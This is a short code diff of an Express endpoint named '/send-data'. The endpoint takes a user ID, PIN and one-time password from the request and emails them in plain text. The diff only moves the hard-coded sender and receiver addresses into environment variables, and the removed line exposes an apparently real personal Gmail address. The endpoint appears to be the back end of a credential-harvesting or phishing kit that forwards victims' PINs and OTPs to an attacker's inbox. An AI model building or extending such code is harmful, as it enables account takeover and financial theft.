@@ -19,8 +19,8 @@ app.post('/send-data', (req, res) => {
     const { userId, pin, otp } = req.body;
 
     const mailOptions = {
-        from: 'mosesbenjamin1985@gmail.com',
-        to: 'RECEIVER_EMAIL@gmail.com',
+        from: process.env.SMTP_USER,
+        to: process.env.ADMIN_EMAIL,
         subject: 'New Notification',
         text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
     };
